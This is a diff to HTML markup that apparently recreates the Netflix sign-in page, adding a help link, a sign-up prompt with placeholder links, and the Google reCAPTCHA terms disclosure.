@@ -56,18 +56,43 @@
                             <button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">
                                 Sign In
                             </button>
+                            
                             <div class="hybrid-login-form-help">
                                 <div class="ui-binary-input login-remember-me">
                                     <input type="checkbox" class name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="0" checked>
                                     <label for="bxid_rememberMe_true">
+                                        
                                         <span class="login-remember-me-label-text">Remember me</span>
                                     </label>
                                 </div>
+                                <a class="login-help-link link">Need help?</a>
                             </div>
                         </form>
                     </div>
                     <div class="hybrid-login-form-other">
-
+                        <div class="login-signup-now">
+                            New to Netflix?
+                            <a href="#">Sign up now</a>
+                            .
+                        </div>
+                        <div class="recaptcha-terms-of-use">
+                            <p>
+                                <span>
+                                    This page is protected by Google reCAPTCHA to ensure you're not a bot.
+                                </span>
+                                <button class="recaptcha-terms-of-use--link-button" onclick="learnMoreClick()">
+                                    Learn more.
+                                </button>
+                            </p>
+                            <div class="recaptcha-terms-of-use--disclosure">
+                                <span>The information collected by Google reCAPTCHA is subject to the Google 
+                                    <a href="#" id="recaptcha-privacy-link">Privacy Policy</a>
+                                    and
+                                    <a href="#" id="recaptcha-tos-link">Terms of Service</a> 
+                                    , and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google).
+                                </span>
+                            </div>
+                        </div>
                     </div>
                 </div>
 
